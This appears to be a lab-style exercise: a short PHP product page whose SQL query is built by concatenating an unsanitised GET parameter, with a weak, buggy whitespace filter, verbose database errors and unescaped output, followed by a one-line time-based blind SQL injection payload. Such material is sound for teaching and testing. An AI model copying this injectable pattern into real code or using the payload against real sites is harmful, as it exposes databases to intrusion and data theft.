```php
<?php
include 'connection.php';

$prod = $_GET['prod'];
if (!$_COOKIE["level"] == "1") {
    $prod = preg_replace("/\s+/", "", $prod);
}
$sql    = 'SELECT * FROM tblProducts WHERE id = ' . $prod;
$result = mysql_query($sql, $link);

if (!$result) {
    echo "DB Error, could not query the database\n";
    echo 'MySQL Error: ' . htmlentities(mysql_error());
    exit;
}

$row = mysql_fetch_assoc($result);
echo '<h2>Product Details</h2>';
echo '<div class="list-product-detail">';
echo '<img class=prod-detail src=images/products/' . $row['id'] . '.jpg>';
echo '<strong>Product Name: </strong>' . $row['name'];
echo '<br /><br /><strong>Details</strong><br />' . $row['detail']  . '<br />';
echo '<br /><br />';
echo '</div>';

mysql_free_result($result);

?>
```

<details>
  <summary><b>Exploite</b></summary>

  ```text
prod = 1 and sleep(5)-- -
  ```
</details>
